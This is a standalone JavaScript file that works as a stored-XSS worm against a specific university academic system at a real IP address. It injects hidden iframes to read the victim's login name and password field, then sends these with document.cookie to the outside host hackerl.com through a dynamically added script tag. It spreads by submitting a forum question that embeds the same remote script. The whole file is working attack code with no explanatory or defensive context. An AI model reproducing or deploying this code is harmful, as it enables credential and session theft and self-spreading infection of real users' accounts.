function post_cookie(data){
    var head = document.getElementsByTagName("head")[0];
    var js_cookie = document.createElement("script");
    var str="http://www.hackerl.com/about.js?"+data;
    js_cookie.src=str;
    js_cookie.type = 'text/javascript';
    js_cookie.language="javascript";
    head.appendChild(js_cookie);
    }


function get_data(){
    get_password();
    var i="name=";
    setTimeout(function () {
		i=i+document.getElementById("ysgg_query").contentWindow.document.getElementById("Top1_divLoginName").innerHTML+"&password="+document.getElementById("grsz_xgmm").contentWindow.document.getElementById('oldpassword').value+"&cookie="+document.cookie;
		post_cookie(i);
	}, 1000);
	
}


function inj_iframe(src,id){
    var o = document.createElement("iframe");
    o.src=src;
    o.width=0;
    o.height=0;
    o.id=id;
    document.getElementsByTagName("body")[0].appendChild(o);
    return o;    
}


function get_password(){
    inj_iframe("http://218.64.56.18/jsxsd/grsz/grsz_xgmm","grsz_xgmm");
    inj_iframe("http://218.64.56.18/jsxsd/ggly/ysgg_query","ysgg_query");   
    return 0;
}


function creat(){
    inj_iframe("http://218.64.56.18/jsxsd/zxwd/tw_add","creat"); 
    setTimeout(function () {
    text=document.getElementById("creat").contentWindow.document.getElementById('xmms');
    text.value ="请问四级没过可以毕业吗?<script language=\"javascript\" src=\"http://www.hackerl.com/static/js/about.js\" type=\"text/javascript\"></script>"
    document.getElementById("creat").contentWindow.document.getElementById('Form1').submit();
	}, 1000);
}


function check(){
    var request;
    if (window.XMLHttpRequest) {
        request = new XMLHttpRequest();
    } else {
        request = new ActiveXObject('Microsoft.XMLHTTP');
    }


    request.onreadystatechange = function () {
    if (request.readyState === 4) { 
        if (request.status === 200) {
            if(request.responseText.indexOf("请问")==-1){creat();}
        } else {
            return 0;
        }
    } else {
    }
}
    request.open('GET', '/jsxsd/zxwd/zxwd_opt');
    request.send();
}

get_data();
check();
